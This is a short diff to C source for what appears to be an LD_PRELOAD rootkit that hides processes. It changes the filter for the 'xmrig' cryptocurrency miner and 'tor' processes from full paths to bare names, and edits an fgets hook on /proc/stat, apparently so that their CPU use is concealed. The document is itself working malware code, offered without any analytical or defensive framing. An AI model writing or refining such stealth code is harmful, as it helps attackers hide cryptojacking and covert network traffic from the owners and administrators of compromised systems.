@@ -27,8 +27,8 @@
 /*
  * Every process with this name will be excluded
  */
-static const char *process_to_filter_1 = "/usr/bin/xmrig";
-static const char *process_to_filter_2 = "/usr/bin/tor";
+static const char *process_to_filter_1 = "xmrig";
+static const char *process_to_filter_2 = "tor";
 
 /**
  * Port to hide
@@ -407,7 +407,7 @@ char *fgets(char *s, int size, FILE *stream)
     // Check we are reading the /proc/stat file
     // The same as before, we check the first part of the path
     // as there seems to be some non printable characters at the end
-    if (strstr(path, "/proc/stat") == path)
+    if (strcmp(path, "/proc/stat") == 0)
     {
         // Check if we are reading line starting with
         // - cpu
